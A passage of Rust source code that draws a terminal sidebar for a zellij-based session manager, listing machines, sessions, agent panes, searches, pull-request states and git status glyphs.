        let laid = Layout { area, top: self.top, rows, bottom, notes: notes.said };
        lines.extend(drawn.into_iter().skip(self.top).take(room));
        let notes_from = height.saturating_sub(notes.lines.len());
        lines.resize(notes_from, Line::default());
        let goes_on = notes.goes_on.iter().map(|line| notes_from + line).collect();
        lines.extend(notes.lines);
        put(buffer, area, &lines, self.framing());
        let mut spots = Spots::default();
        let mut cut_spots = Spots::default();
        let shown = self.top..self.top + room;
        for NumberAt { line, columns, link } in numbers {
            if shown.contains(&line) {
                spots.add(HEADER + line - self.top, columns, link.clone());
            }
        }
        for CutAt { line, column, took } in cuts {
            if shown.contains(&line) {
                cut_spots.add(HEADER + line - self.top, column..column + 1, took);
            }
        }
        // The rows and the notes go short of the edge, the notes along the
        // bottom.
        let inside = inside(area);
        if matches!(&self.moving, Moving::Swept(_, under) if *under != laid) {
            self.moving = Moving::Still;
        }
        if let Moving::Sweeping(sweep) | Moving::Swept(sweep, _) = &self.moving {
            sweep.draw(buffer, inside);
        }
        self.laid = laid;
        self.page = Page { lines, goes_on, cuts: cut_spots.placed(inside) };
        self.aloud_buttons = buttons.down(notes_from).placed(inside);
        Drawn::Sidebar {
            numbers: spots.placed(inside),
            bottom: Box::new(spotted.placed(notes_from, inside)),
        }
    }

    /// Draws the sidebar collapsed into `area`: a rule along the top, and
    /// under it the counts of `tallies` that are not 0, one to a line, each cut
    /// to the room it has, and a pause of what is read aloud, which you cannot
    /// hear, as the icon of its button. Its last column is the edge, as the
    /// sidebar's is. The rule is in `ERROR` while the daemon does not answer, or
    /// `NAME` while an image is on its way, as the note that says so is, which
    /// the strip has no room for.
    pub fn draw_collapsed(&mut self, buffer: &mut Buffer, area: Rect, now: SystemTime) {
        self.drawing(now);
        self.unsweep();
        self.aloud_buttons = Spots::default();
        let width = usize::from(area.width.saturating_sub(1));
        let rule = if self.away.is_some() {
            Style::new().fg(ERROR)
        } else if self.image_going.is_some() {
            Style::new().fg(NAME)
        } else {
            Style::new().add_modifier(Modifier::DIM)
        };
        let mut lines = vec![Line::styled(RULE.repeat(width), rule), Line::default()];
        for (count, (glyph, style)) in tallies(self.counts, frame(now)) {
            if count == 0 {
                continue;
            }
            let count = cut(&count.to_string(), width.saturating_sub(glyph.width()));
            lines.push(Line::from(vec![Span::styled(glyph, style), Span::styled(count, style)]));
        }
        if self.aloud.as_ref().is_some_and(aloud::Shown::paused) {
            lines.push(Line::styled(aloud::PLAY, Style::new().fg(ACCENT)));
        }
        put(buffer, area, &lines, self.framing());
    }

    /// Builds the rows again, as the sidebar is drawn at `now`, where a
    /// command has run long enough by then to show.
    fn drawing(&mut self, now: SystemTime) {
        self.drawn = Some(now);
        if self.due.is_some_and(|due| due <= now) {
            self.rebuild();
        }
    }

    /// The top of the sidebar, over the rows: its title, its rule, and a
    /// blank line.
    fn top(&self, width: usize, frame: usize) -> [Line<'static>; HEADER] {
        [self.title(width), self.header(width, frame), Line::default()]
    }

    /// How the title's rule and the edge are drawn: in `ACCENT` while the
    /// sidebar has the keys, and dim while zellij or a box over it has them.
    fn framing(&self) -> Style {
        match self.keys {
            Keys::Sidebar => Style::new().fg(ACCENT),
            Keys::Zellij | Keys::Lent | Keys::Menu { .. } => {
                Style::new().add_modifier(Modifier::DIM)
            },
        }
    }

    /// The first line: `menu::TITLE` on a rule out to the edge, drawn as
    /// `framing` says, the word bold while the sidebar has the keys.
    fn title(&self, width: usize) -> Line<'static> {
        let rule = self.framing();
        let name =
            if self.keys == Keys::Sidebar { rule.add_modifier(Modifier::BOLD) } else { rule };
        let word = format!(" {} ", menu::TITLE);
        let rest = width.saturating_sub(RULE.width() + word.width());
        Line::from(vec![
            Span::styled(RULE, rule),
            Span::styled(word, name),
            Span::styled(RULE.repeat(rest), rule),
        ])
    }

    /// The rule under the title: how many sessions the rows list, how many
    /// agents on them wait for you, how many panes have the dot, and how many
    /// agents are at work, and how many are in a shell.
    fn header(&self, width: usize, frame: usize) -> Line<'static> {
        let dim = Style::new().add_modifier(Modifier::DIM);
        let Counts { sessions, waiting, .. } = self.counts;
        let mut counts: Vec<Span<'static>> = Vec::new();
        let waits = (waiting, Mark::Waiting.glyph(frame));
        for (count, (glyph, style)) in std::iter::once(waits).chain(tallies(self.counts, frame)) {
            if count == 0 {
                continue;
            }
            if !counts.is_empty() {
                counts.push(Span::raw(" "));
            }
            counts.push(Span::styled(glyph, style));
            counts.push(Span::styled(count.to_string(), style));
        }
        let word = match sessions {
            0 => String::new(),
            1 => " 1 session ".to_owned(),
            n => format!(" {n} sessions "),
        };
        let counted: usize = counts.iter().map(|span| span.content.width()).sum();
        let tail = if counted > 0 { counted + 3 } else { 0 };
        let rule = width.saturating_sub(1 + word.width() + tail);
        let mut spans = vec![Span::styled(RULE, dim), Span::styled(word, dim)];
        spans.push(Span::styled(RULE.repeat(rule), dim));
        if counted > 0 {
            spans.push(Span::raw(" "));
            spans.extend(counts);
            spans.push(Span::raw(" "));
            spans.push(Span::styled(RULE, dim));
        }
        Line::from(spans)
    }

    /// What goes at the bottom of a sidebar `height` tall: why the daemon
    /// does not answer, the sessions it lists that the rows leave out, the
    /// session files of Claude Code's it cannot read, what went wrong last,
    /// which pull request's link was copied, and the menu while it is open, or
    /// else the search while that is, or else the legend while the sidebar has
    /// the focus.
    /// The menu, the search and the legend leave the rows a line. And what has
    /// the mouse there, the menu or the keys of the search or the legend, with
    /// the spots on it by their line among the notes, and the buttons of what
    /// is being read aloud by theirs. A spinner on the menu shows `frame`.
    fn notes(
        &self,
        width: usize,
        height: usize,
        frame: usize,
    ) -> (Notes, Drawn, Spots<aloud::Button>) {
        let mut notes = Notes::default();
        let error = Style::new().fg(ERROR);
        if let Some(away) = &self.away {
            notes.say(&format!("lunetad: {away}"), width, error);
        }
        if self.unlisted > 0 {
            let count = self.unlisted;
            let sessions = if count == 1 { "session" } else { "sessions" };
            let unlisted = format!(
                "lunetad: {count} {sessions} with no start or socket, or a name zellij refuses, \
                 not listed"
            );
            notes.say(&unlisted, width, error);
        }
        if self.unlisted_machines > 0 {
            let count = self.unlisted_machines;
            let machines = if count == 1 { "machine" } else { "machines" };
            let unlisted = format!(
                "lunetad: {count} {machines} with a destination luneta does not read, or named \
                 twice, not listed"
            );
            notes.say(&unlisted, width, error);
        }
        if let Some(unread) = self.host.as_ref().and_then(Host::unread_count) {
            notes.say(&unread.to_string(), width, error);
        }
        if self.host.as_ref().is_some_and(|host| host.unread_hosts.is_some_and(|it| it > 0)) {
            let unread = "lunetad could not read all of luneta's hosts file: its log says why";
            notes.say(unread, width, error);
        }
        if let Some(why) = self.unreached() {
            notes.say(&why, width, error);
        }
        if let Some(lost) = self.folds.lost() {
            notes.say(&format!("folds stay in this luneta: {lost}"), width, error);
        }
        if let Some(lost) = self.news.lost() {
            notes.say(&format!("dots stay in this luneta: {lost}"), width, error);
        }
        if let Some(lost) = self.order.lost() {
            notes.say(&format!("order stays in this luneta: {lost}"), width, error);
        }
        if let Some(unread) = self.order.unread() {
            notes.say(&format!("order not read: {unread}"), width, error);
        }
        if let Some(notice) = &self.notice {
            notes.say(notice, width, error);
        }
        if let Some((number, _)) = &self.copied {
            notes.say(&format!("copied #{number}"), width, Style::new().fg(NAME));
        }
        if let Some(to) = &self.image_going {
            let going = format!("image on its way to {to}");
            notes.say(&going, width, Style::new().fg(NAME));
        }
        if let Some(Sent::Going { session, from: Some(Leaving { ends: true, .. }), .. }) =
            &self.sent
        {
            let going = format!("Going to {session}; this session ends once you are there");
            notes.say(&going, width, Style::new().fg(NAME));
        }
        if let Moving::Asking(carrying, landing) = &self.moving {
            let what = match carrying.whole {
                Whole::Pane => "this pane",
                Whole::Tab => "this tab",
            };
            let (from, to) = (carrying.place.session.name(), landing.session().name());
            let asks = format!(
                "Moving {what} to {to} ends {from}, as it is all {from} has: y moves it, any \
                 other key keeps it"
            );
            notes.say(&asks, width, Style::new().fg(NAME));
        }
        let mut buttons = Spots::default();
        if let Some(aloud) = &self.aloud {
            let (line, spots) = aloud.line(width);
            buttons = spots.down(notes.lines.len());
            notes.lines.push(line);
        }
        let room = height.saturating_sub(HEADER + 1 + notes.lines.len());
        let above = notes.lines.len();
        let (lines, spotted) = match self.bottom() {
            Bottom::Menu(menu) => {
                let (lines, spots) = menu.lines(width, room, frame);
                let spots = spots.down(above);
                (lines, Drawn::Menu { number: menu.number(), area: None, spots })
            },
            Bottom::Search(search) => {
                let (lines, spots) = self.searching(search, width, room);
                (lines, Drawn::Keys(Keyed::Search, spots.down(above)))
            },
            Bottom::Legend => {
                let (lines, spots) = menu::legend(width, room);
                (lines, Drawn::Keys(Keyed::Legend, spots.down(above)))
            },
            Bottom::Yank => {
                let (lines, spots) = menu::yanks(width, room);
                (lines, Drawn::Keys(Keyed::Legend, spots.down(above)))
            },
            Bottom::Nothing => (Vec::new(), Drawn::Nothing),
        };
        notes.lines.extend(lines);
        (notes, spotted, buttons)
    }

    /// The search at the bottom, in at most `room` lines `width` wide, as a
    /// group of the menu stands there: a rule that names it, and once
    /// something is typed, counts the panes it finds of every pane; what is
    /// typed; and the keys it takes, a spot on each that presses it, while the
    /// sidebar has the keys: under a box over zellij they are the box's, and
    /// the search shows none, as the legend shows none there. Short of room,
    /// it leaves out the keys, and then the rule.
    fn searching(
        &self,
        search: &Search,
        width: usize,
        room: usize,
    ) -> (Vec<Line<'static>>, Spots<KeyEvent>) {
        let (term, counted) = match search {
            // Nothing typed narrows nothing: a folded session's panes stay out
            // of the rows, uncounted.
            Search::Empty => ("", String::new()),
            Search::Typed { term, .. } => {
                let found = self.rows.iter().filter(|row| matches!(row, Row::Pane { .. }));
                (term.as_str(), format!("{}/{}", found.count(), self.counts.panes))
            },
        };
        let mut lines = Vec::with_capacity(3);
        if room >= 2 {
            lines.push(menu::rule(Command::Search.does(), &counted, width));
        }
        lines.extend((room >= 1).then(|| query(term, width)));
        if room < 3 || self.keys != Keys::Sidebar {
            return (lines, Spots::default());
        }
        let (keys, spots) = menu::keyed(width, &[(Hint::Enter, "Go"), (Hint::Esc, "Close")]);
        let at = lines.len();
        lines.push(keys);
        (lines, spots.down(at))
    }

    /// Why lunetad does not reach the machine of the header the keys took the
    /// highlight to, while they are the sidebar's, as the header says it in a
    /// word.
    fn unreached(&self) -> Option<String> {
        if self.keys != Keys::Sidebar {
            return None;
        }
        match &self.rows[self.cursor_index()?] {
            Row::Machine { name, heads: Heads::Away(Away::Unreached { why, .. }), .. } => {
                Some(format!("{name}: {why}; what ssh said is in {}", lunetad::log::NAME))
            },
            Row::Machine { .. } | Row::Session { .. } | Row::Pane { .. } => None,
        }
    }

    /// What the sidebar shows under its rows: the menu while it is open
    /// there, or else the search while that is, or else, while the sidebar
    /// has the keys, what `y` waits for while it does, or else the legend.
    fn bottom(&self) -> Bottom<'_> {
        if let Some(menu) = self.menu.as_ref().filter(|_| !self.floats()) {
            Bottom::Menu(menu)
        } else if let Some(search) = &self.search {
            Bottom::Search(search)
        } else if self.keys == Keys::Sidebar {
            if self.pending == Pending::Yank { Bottom::Yank } else { Bottom::Legend }
        } else {
            Bottom::Nothing
        }
    }
}

/// What the sidebar shows under its rows, at the bottom of its notes.
enum Bottom<'a> {
    Menu(&'a Menu),
    /// The search, as it stands.
    Search(&'a Search),
    Legend,
    /// What `y` waits for, in the legend's place.
    Yank,
    Nothing,
}

/// The counts the sidebar keeps collapsed, each by the glyph of what it
/// counts, which the spinner shows at `frame`, and its style: how many panes
/// have the dot, and how many agents are at work, and how many are in a shell.
fn tallies(counts: Counts, frame: usize) -> [(usize, (String, Style)); 3] {
    let dot = dot();
    [
        (counts.new, (dot.content.into_owned(), dot.style)),
        (counts.busy, Mark::Busy.glyph(frame)),
        (counts.shell, Mark::Shell.glyph(frame)),
    ]
}

/// The column of the edge of a sidebar drawn into `area`, its last, where it
/// has any: where it is drawn, and where a press takes it to drag.
pub fn edge(area: Rect) -> Option<u16> {
    area.width.checked_sub(1).map(|last| area.x + last)
}

/// A sidebar's `area` short of its edge, where its rows and notes go.
fn inside(area: Rect) -> Rect {
    Rect { width: area.width.saturating_sub(1), ..area }
}

/// Puts `lines` into `area` of `buffer`, one to each of its lines, with what
/// was there before gone, and the edge down its last column in `framing`, on
/// every line of it, however few `lines` there are.
fn put(buffer: &mut Buffer, area: Rect, lines: &[Line<'static>], framing: Style) {
    buffer.set_style(area, Style::reset().fg(gruvbox::FG1));
    for (line, y) in lines.iter().zip(area.top()..area.bottom()) {
        buffer.set_line(area.x, y, line, area.width.saturating_sub(1));
    }
    if let Some(x) = edge(area) {
        for y in area.top()..area.bottom() {
            buffer.set_string(x, y, EDGE, framing);
        }
    }
}

/// What is typed in a search, `width` wide, before a `_` for the cursor, its
/// end where it is too long. What it is typed in names it a search: the
/// rule over it, or the box around it.
pub fn query(term: &str, width: usize) -> Line<'static> {
    let typed = tail(&format!("{term}_"), width.saturating_sub(1));
    Line::from(vec![Span::raw(" "), Span::styled(typed, Style::new().fg(ACCENT))])
}

/// Whether zellij's `title` for a terminal can be of the session `name`: it is
/// the name, or starts with it before a ` | `.
pub fn in_session(title: &str, name: &str) -> bool {
    title.strip_prefix(name).is_some_and(|rest| rest.is_empty() || rest.starts_with(" | "))
}

/// The clients the daemon lists of the session called `name` of `sessions`,
/// unless another runs under that name too, which it lists none of either.
fn clients<'a>(sessions: &'a [Session], name: &str) -> Option<&'a [Client]> {
    let mut named = sessions.iter().filter(|session| session.name == name);
    let (Some(session), None) = (named.next(), named.next()) else {
        return None;
    };
    session.clients.as_ref().map(|clients| clients.clients.as_slice())
}

/// The pull request of the branch checked out in each directory a daemon
/// says one of, of `pull_requests`, by the directory: as the rows show it,
/// and as a key of the menu for one finds where it goes. None of one with no
/// number or state, or a state of a newer daemon's.
fn pull_requests(pull_requests: &[lunetad::api::PullRequest]) -> HashMap<&str, PullRequest> {
    pull_requests
        .iter()
        .filter_map(|it| Some((it.dir.as_str(), PullRequest::of_api(it)?)))
        .collect()
}

/// The other machines of `host` that luneta has yet to hear enough of to
/// choose among their sessions, as `Sidebar::refuges_away` does: those lunetad
/// has yet to reach or give up on, and, where luneta's own terminal may be
/// `within` another machine's zellij, those with a session whose panes zellij
/// there has yet to list, which `may_hold` goes by.
pub fn unheard(host: &Host, within: Within) -> Vec<Destination> {
    let others = machines(host).others.into_iter();
    let unheard = others.filter(|(_, seen)| match seen {
        Ok(seen) => {
            let unlisted = |session: &Session| session.panes.is_none();
            within != Within::Here && seen.sessions.iter().any(unlisted)
        },
        Err(Away::Reaching) => true,
        Err(Away::Unreached { .. }) => false,
    });
    unheard.map(|(destination, _)| destination).collect()
}

/// The programs that bring a terminal of another machine's into a pane: ssh,
/// and luneta, which runs ssh beside its sidebar for another machine's
/// session.
const CARRIERS: [&str; 2] = ["ssh", "luneta"];

/// Whether `session`, of another machine's, may hold luneta's own terminal in
/// one of its panes: one of them runs one of `CARRIERS`, or runs what zellij
/// there has yet to say, or zellij there has yet to list its panes.
fn may_hold(session: &Session) -> bool {
    let Some(panes) = &session.panes else {
        return true;
    };
    panes.panes.iter().any(|pane| {
        pane.command.as_deref().is_none_or(|command| {
            icons::program(command).is_some_and(|program| CARRIERS.contains(&program))
        })
    })
}

/// The sessions the daemon lists, as the sidebar tells them apart, oldest
/// first, so that a row never moves under your eye or your mouse but as you
/// move it; and how many it lists that `Listed` leaves out.
fn oldest_first(sessions: &[Session]) -> (Vec<(Listed, &Session)>, usize) {
    let mut listed: Vec<(Listed, &Session)> = sessions
        .iter()
        .filter_map(|session| Some((Listed::of(session)?, session)))
        .collect();
    let unlisted = sessions.len() - listed.len();
    listed.sort_by(|(a, _), (b, _)| {
        (a.kept.started(), a.name.as_str()).cmp(&(b.kept.started(), b.name.as_str()))
    });
    (listed, unlisted)
}

/// `items` with those `taken` put back before the one at `to` of those left,
/// or after the last of them.
/// The rows, by their index, of `count`, in the order they show while those
/// `carried` show after the row `after`, as they land there.
fn set_down(count: usize, carried: &Range<usize>, after: usize) -> Vec<usize> {
    let mut order: Vec<usize> = (0..count).filter(|at| !carried.contains(at)).collect();
    let place = order.iter().position(|at| *at == after).map_or(order.len(), |place| place + 1);
    order.splice(place..place, carried.clone());
    order
}

fn moved<T: Clone>(items: &[T], taken: Range<usize>, to: usize) -> Vec<T> {
    let left = items.iter().enumerate().filter(|(at, _)| !taken.contains(at));
    let mut moved: Vec<T> = left.map(|(_, item)| item.clone()).collect();
    moved.splice(to..to, items[taken].iter().cloned());
    moved
}

/// What can be read of `agent`'s transcript: Claude Code's alone, by its id.
/// Another harness's id is no name of one of its.
fn transcript(agent: &Agent) -> Transcript {
    match agent.runs_in() {
        Harness::ClaudeCode => {
            SessionId::parse(&agent.session_id).map_or(Transcript::Unnamed, Transcript::Named)
        },
        Harness::Pi | Harness::Unspecified => Transcript::NotRead,
    }
}

/// Where an agent works, as its row, the picker and a search say it: where
/// zellij says its pane works, which its branch is found by, or else, while
/// zellij has not said, where its harness says.
fn agent_dir<'a>(agent: &'a Agent, pane: &'a Pane) -> &'a str {
    pane.cwd.as_deref().unwrap_or(&agent.cwd)
}

/// What a pane's row is named. Its agent goes by the name someone gave it, or
/// else by the topic the daemon keeps of it, or else by the topic the daemon
/// reads in the title Claude Code gives its pane; or else by its tab, if someone
/// named it, or else by where it works. A program goes by its command line, the
/// program by its binary's name, and a shell at its prompt by its tab, if someone
/// named it, as an agent does, or else by its directory's last two parts.
fn label(agent: Option<&Agent>, pane: &Pane) -> String {
    if let Some(agent) = agent {
        let titled = pane.titled.as_ref().and_then(|titled| titled.topic.as_deref());
        let topic = agent.topic.as_deref().or(titled);
        let name = given_name(agent).or(topic).or(tab::named(&pane.tab_name));
        return name.map_or_else(|| short_cwd(agent_dir(agent, pane)), str::to_owned);
    }
    let mut words = pane.command.iter().flat_map(|command| command.split_whitespace());
    let program = words.next().map(|program| {
        let program = program.rsplit('/').next().unwrap_or(program);
        program.strip_prefix('-').unwrap_or(program)
    });
    match program {
        Some(program) if !icons::SHELLS.contains(&program) => {
            [program].into_iter().chain(words).collect::<Vec<_>>().join(" ")
        },
        _ => match (tab::named(&pane.tab_name), pane.cwd.as_deref()) {
            (Some(tab), _) => tab.to_owned(),
            (None, Some(cwd)) => short_cwd(cwd),
            (None, None) => format!("pane {}", pane.id),
        },
    }
}

/// The mark of `agent`, in the pane of `key`, as its row shows it, and when
/// it finished, where it is done: what it is doing, or that it finished since
/// you were last in its pane, but in the pane luneta's zellij is on, `here`,
/// where you see it.
fn agent_marked(news: &News, agent: &Agent, key: Key, here: bool) -> (Marked, Option<SystemTime>) {
    let mut marked = Marked::of(agent);
    let done = marked.since.filter(|_| marked.mark == Mark::Idle);
    if !here && news.is_new(key, done) {
        marked.mark = Mark::Finished;
    }
    (marked, done)
}

/// What an agent is doing, in the word Claude Code says it in, for the brief.
fn status_word(agent: &Agent) -> String {
    match &agent.status {
        Some(Reported::KnownStatus(known)) => match Status::try_from(*known) {
            Ok(Status::Waiting) => "waiting".to_owned(),
            Ok(Status::Idle) => "idle".to_owned(),
            Ok(Status::Busy) => "busy".to_owned(),
            Ok(Status::Shell) => "shell".to_owned(),
            Ok(Status::Unspecified) | Err(_) => "unknown".to_owned(),
        },
        Some(Reported::OtherStatus(word)) => word.clone(),
        None => "unreported".to_owned(),
    }
}

/// The name of an agent's session, if someone gave it one.
fn given_name(agent: &Agent) -> Option<&str> {
    agent.name.as_ref()?.given()
}

/// A directory as luneta shows one: its last two parts.
pub fn short_cwd(path: &str) -> String {
    let parts: Vec<&str> = path.split('/').filter(|part| !part.is_empty()).collect();
    match parts.as_slice() {
        [] => path.to_owned(),
        [only] => (*only).to_owned(),
        [.., parent, base] => format!("{parent}/{base}"),
    }
}

/// How well a row matches a search: a row that shows what is typed itself
/// beats any other, and then the higher score wins.
pub type Fit = (bool, i64);

/// What is typed in a search, and the matcher the sidebar and the picker
/// find their rows with.
pub struct Finder<'a> {
    matcher: SkimMatcherV2,
    /// The matcher, but for a match at the start of a text, which counts as
    /// one at the start of any word in it.
    anywhere: SkimMatcherV2,
    term: &'a str,
}

impl<'a> Finder<'a> {
    pub fn new(term: &'a str) -> Self {
        let anywhere = SkimScoreConfig { bonus_first_char_multiplier: 1, ..Default::default() };
        let anywhere = SkimMatcherV2::default().score_config(anywhere);
        Finder { matcher: SkimMatcherV2::default(), anywhere, term }
    }

    /// A session by its name: how well it fits, and the characters of the
    /// name the search found.
    fn session(&self, name: &str) -> Option<(Fit, Vec<usize>)> {
        self.find(name, &[])
    }

    /// A pane by its row, its branch, its tab and the directory it, or its
    /// agent, works in: how well the best of them fits, and the characters of
    /// its `label` the search found. A tab zellij named `Tab #N` is no name to
    /// find, and a directory is its last two parts, as a shell's row shows it:
    /// a whole path has the letters for a few typed ones to land on nearly any
    /// of it.
    fn pane(
        &self,
        label: &str,
        branch: Option<&str>,
        tab_name: &str,
        cwd: Option<&str>,
    ) -> Option<(Fit, Vec<usize>)> {
        let cwd = cwd.map(short_cwd);
        self.find(label, &[branch, tab::named(tab_name), cwd.as_deref()])
    }

    /// What is typed against what a row shows, and against what else the row
    /// goes by, of which it need not have each: how well the best of them
    /// fits, and the characters of what the row shows that the search found.
    /// None light up where something else fits better, but for its start:
    /// `review` fits a session named `review` better than its agent's row
    /// `docs (review:4)` only by starting it, and lights up in the row.
    pub fn find(&self, shown: &str, also: &[Option<&str>]) -> Option<(Fit, Vec<usize>)> {
        let exact = shown == self.term;
        let best = |matcher: &SkimMatcherV2| {
            also.iter().flatten().filter_map(|text| matcher.fuzzy_match(text, self.term)).max()
        };
        let other = best(&self.matcher);
        let Some((score, hits)) = self.matcher.fuzzy_indices(shown, self.term) else {
            return Some(((exact, other?), Vec::new()));
        };
        let fits = |score: i64, other: Option<i64>| other.is_none_or(|other| score >= other);
        let lit = fits(score, other)
            || self.anywhere.fuzzy_match(shown, self.term).is_some_and(|anywhere| {
                fits(anywhere, best(&self.anywhere))
            });
        let fit = (exact, other.map_or(score, |other| score.max(other)));
        Some((fit, if lit { hits } else { Vec::new() }))
    }
}

fn log_unasked(plan: &prunes::Plan) {
    for unasked in &plan.unasked {
        log::say(&format!("{}: {}", unasked.worktree, unasked.why));
    }
}

fn repository_of(tree: &WorkTree) -> Option<String> {
    match tree {
        WorkTree::NoCheckout { repository }
        | WorkTree::Checkout { repository: Some(repository), .. } => {
            Some(repository.as_str().to_owned())
        },
        WorkTree::Outside | WorkTree::Checkout { repository: None, .. } => None,
    }
}

/// The branch checked out in a work tree, how the tree stands, how many lines
/// changed on the branch, and its `pull_request`, or none for a detached
/// `HEAD` or a directory in no repository.
fn checkout(tree: &WorkTree, pull_request: Option<&PullRequest>) -> Option<Checkout> {
    let WorkTree::Checkout {
        head: Head::Branch { name, upstream, changed },
        changes,
        stashes,
        ..
    } = tree
    else {
        return None;
    };
    Some(Checkout {
        branch: name.as_str().to_owned(),
        status: glyphs(changes, *stashes, *upstream),
        changed: *changed,
        pull_request: pull_request.and_then(numbered),
    })
}

/// A pull request as its branch's line shows it, in the colour of its state,
/// which gh lists it in: green while it is open, grey while it is a draft, and
/// purple once it is merged. A closed one is none. What its daemon says of its
/// page is taken only as this pull request's link: another machine's says it,
/// and the clipboard and the browser take what they are handed. One open, or
/// a draft, has what its checks come to, where its daemon says them.
fn numbered(pull_request: &PullRequest) -> Option<Numbered> {
    let colour = match pull_request.state {
        State::Open => gruvbox::GREEN,
        State::Draft => gruvbox::GREY,
        State::Merged => gruvbox::PURPLE,
        State::Closed => return None,
    };
    let checks = pull_request.verdict();
    let number = pull_request.number;
    let link = pull_request.url.as_deref().and_then(Link::parse);
    let link = link.filter(|link| link.kind() == Kind::Pull && link.number() == number);
    let number = link.map_or(Number::Unlinked(number), |link| Number::Linked(Box::new(link)));
    Some(Numbered { number, colour, checks })
}

/// The mark after a pull request's number for what its checks come to, as
/// GitHub marks them, in its colour: one failed, one has yet to end, or each
/// passed.
fn verdict_mark(verdict: Verdict) -> Span<'static> {
    let (mark, colour) = match verdict {
        Verdict::Failing => ("✗", gruvbox::RED),
        Verdict::Pending => ("●", gruvbox::YELLOW),
        Verdict::Passing => ("✓", gruvbox::GREEN),
    };
    Span::styled(mark, Style::new().fg(colour))
}

/// The glyph of each kind of change there is, then the one for where the
/// branch stands against its upstream, where it has one: what starship's
/// `git_status` shows, with its default glyphs and in its order.
fn glyphs(changes: &Changes, stashes: u32, upstream: Option<Upstream>) -> String {
    let kinds = [
        (changes.conflicted, '='),
        (stashes, '$'),
        (changes.deleted, '✘'),
        (changes.renamed, '»'),
        (changes.modified, '!'),
        (changes.staged, '+'),
        (changes.untracked, '?'),
    ];
    let mut glyphs: String =
        kinds.iter().filter(|(count, _)| *count > 0).map(|(_, glyph)| *glyph).collect();
    match upstream.map(|upstream| (upstream.ahead, upstream.behind)) {
        Some((ahead, behind)) if ahead > 0 && behind > 0 => glyphs.push('⇕'),
        Some((ahead, _)) if ahead > 0 => glyphs.push('⇡'),
        Some((_, behind)) if behind > 0 => glyphs.push('⇣'),
        _ => {},
    }
    glyphs
}

/// How long ago `since` was, in the unit that says the most of it.
pub fn age(since: SystemTime, now: SystemTime) -> String {
    let secs = now.duration_since(since).unwrap_or(Duration::ZERO).as_secs();
    match secs {
        0..=59 => format!("{secs}s"),
        60..=3599 => format!("{}m", secs / 60),
        3600..=86_399 => format!("{}h", secs / 3600),
        86_400..=604_799 => format!("{}d", secs / 86_400),
        _ => format!("{}w", secs / 604_800),
    }
}

/// The frame the spinner shows at `now`: the same on every row, and the next
/// one each `SPIN`.
pub fn frame(now: SystemTime) -> usize {
    let since = now.duration_since(SystemTime::UNIX_EPOCH).unwrap_or(Duration::ZERO);
    let turns = since.as_millis() / SPIN.as_millis();
    let frames = u128::try_from(SPINNER.len()).expect("a spinner of ten frames");
    usize::try_from(turns % frames).expect("a frame of the spinner's")
}

/// Where the number of a pull request with a link is, on the lines of a row, for
/// a click to copy that link.
struct NumberAt<'a> {
    /// Which of them it is on.
    line: usize,
    columns: Range<usize>,
    link: &'a Link,
}

/// Where the `…` of a text cut short is, on the lines of a row, for a sweep over
/// it to copy what it stands for.
struct CutAt {
    /// Which of them it is on.
    line: usize,
    column: usize,
    /// What the cut took of the text, with no control character, as a row draws
    /// none: one that shows nowhere is not to hide in a paste.
    took: String,
}

/// Where the `…` is of `text` as `cut` cuts it to `room`, drawn from the column
/// `column` of the line `line`: nowhere, while all of it shows.
fn cut_at(line: usize, column: usize, text: &str, room: usize) -> Option<CutAt> {
    let shown = cut(text, room);
    if shown == text {
        return None;
    }
    let kept = shown.strip_suffix('…')?;
    let took = text.strip_prefix(kept)?.chars().filter(|c| !c.is_control()).collect();
    Some(CutAt { line, column: column + cells(kept), took })
}

/// The lines a row is drawn on, and what the row has on them that the mouse goes
/// by.
struct RowLines<'a> {
    lines: Vec<Line<'static>>,
    /// Its number that takes a click.
    number: Option<NumberAt<'a>>,
    /// Its texts cut short.
    cuts: Vec<CutAt>,
}

/// The lines a row is drawn on, `width` wide.
fn row_lines(row: &Row, width: usize, frame: usize, now: SystemTime) -> RowLines<'_> {
    let dim = Style::new().add_modifier(Modifier::DIM);
    match row {
        Row::Machine { name, heads: Heads::Away(away), .. } => {
            // Dimmed, with nothing under it: what stopped lunetad reaching
            // it, and since when.
            let (word, since) = away.said();
            let age = since.map_or_default(|since| age(since, now));
            let reserve = if age.is_empty() { 0 } else { age.width() + 1 };
            let whole = format!("{name} · {word}");
            let room = width.saturating_sub(5 + reserve + 1);
            let said = cut(&whole, room);
            let gap = width.saturating_sub(5 + said.width() + age.width() + 1);
            let line = Line::from(vec![
                Span::raw(" "),
                Span::styled(FOLDED, dim),
                Span::raw(" "),
                Span::styled(COMPUTER, dim),
                Span::raw(" "),
                Span::styled(said, dim),
                Span::raw(" ".repeat(gap)),
                Span::styled(age, dim),
            ]);
            let cuts = cut_at(0, 5, &whole, room).into_iter().collect();
            RowLines { lines: vec![line], number: None, cuts }
        },
        Row::Machine { name, heads: Heads::Sessions { under, waiting, dot, busy, here }, .. } => {
            let folded = *under == Under::Folded;
            let badge = badge(*waiting, folded && *dot, folded && *busy, frame);
            let reserve = badge.as_ref().map_or(0, |badge| badge.content.width() + 1);
            let room = width.saturating_sub(6 + reserve + 1);
            let cuts = cut_at(0, 5, name, room).into_iter().collect();
            let name = cut(name, room);
            let rule = width.saturating_sub(5 + name.width() + 1 + reserve + 1);
            // Folded, its rule says luneta's zellij is in one of its
            // sessions, as the session's own row would.
            let rule_style = if *here && folded { Style::new().fg(ACCENT) } else { dim };
            let bold = Style::new().add_modifier(Modifier::BOLD);
            let mut spans = vec![
                Span::raw(" "),
                Span::styled(if folded { FOLDED } else { UNFOLDED }, dim),
                Span::raw(" "),
                Span::styled(COMPUTER, bold),
                Span::raw(" "),
                Span::styled(name, bold),
                Span::raw(" "),
                Span::styled(MACHINE_RULE.repeat(rule), rule_style),
            ];
            if let Some(badge) = badge {
                spans.push(Span::raw(" "));
                spans.push(badge);
            }
            RowLines { lines: vec![Line::from(spans)], number: None, cuts }
        },
        Row::Session { session, hits, under, here, colour, waiting, dot, busy, .. } => {
            let folded = *under == Under::Folded;
            let badge = badge(*waiting, folded && *dot, folded && *busy, frame);
            let reserve = badge.as_ref().map_or(0, |badge| badge.content.width() + 1);
            // The name sits on the session's colour, with a space either side,
            // as a browser draws the name of a group of tabs.
            let chip = Style::new().fg(gruvbox::BG0).bg(*colour);
            let room = width.saturating_sub(4 + reserve + 1);
            let bold = chip.add_modifier(Modifier::BOLD);
            let (name, named) = lit(session.name.as_str(), room, Keep::Start, hits, bold);
            let cuts = cut_at(0, 3, session.name.as_str(), room).into_iter().collect();
            let rule = width.saturating_sub(3 + named + 1 + reserve + 1);
